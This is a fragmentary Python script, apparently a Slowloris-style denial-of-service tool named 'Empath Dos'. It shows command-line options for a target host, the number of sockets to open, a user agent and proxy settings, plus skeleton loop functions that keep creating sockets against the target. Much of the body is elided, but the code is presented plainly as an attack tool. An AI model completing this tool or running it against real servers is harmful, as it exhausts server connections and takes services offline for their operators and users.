...
parser.add_argument("host", nargs="?", help="Host to attack on")
parser.add_argument(
...
parser.add_argument(
    ...
    "--sockets",
    default=200,
    help="Number of sockets to attack",
    type=int,
)
parser.add_argument(
    "-ua",
...
parser.add_argument(
    ...
    dest="useproxy",
    action="store_true",
    help="Use a proxy for requests...",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
...
if not args.host:
    print("Host is required to perform attack....")
    parser.print_help()
    sys.exit(1)
...
def slowloris_iteration():
    ...
    logging.info("Number of sockets: %s", len(list_of_sockets))
    ...
    logging.info("Creating %s more sockets...", diff)
    for _ in range(diff):
        try:
            ...
            logging.debug("Failed to create more socket: %s", e)
            break
def main():
    ip = args.host
    ...
    while True:
        try:
            ...
            logging.info("Stopping Empath Dos")
            break
        except Exception as e:
            logging.debug("Error in Empath Dos iteration: %s", e)
